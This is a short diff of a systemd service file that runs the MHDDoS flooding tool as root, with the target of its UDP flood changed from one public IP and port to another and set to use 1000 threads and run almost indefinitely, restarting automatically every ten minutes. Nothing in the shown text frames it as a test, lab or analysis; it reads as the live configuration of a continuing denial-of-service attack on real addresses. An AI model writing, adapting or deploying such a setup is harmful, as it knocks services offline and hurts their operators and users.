@@ -29,7 +29,7 @@ User=root
 WorkingDirectory=/root/MHDDoS
 # Debian often puts local-installed packages here:
 Environment=PYTHONPATH=/usr/local/lib/python3.11/dist-packages:/usr/local/lib/python3.12/dist-packages
-ExecStart=/usr/bin/python3 start.py UDP 162.19.126.179:7777 1000 99999999999
+ExecStart=/usr/bin/python3 start.py UDP 40.160.20.9:16261 1000 99999999999
 Restart=always
 RestartSec=5s
 RuntimeMaxSec=10min
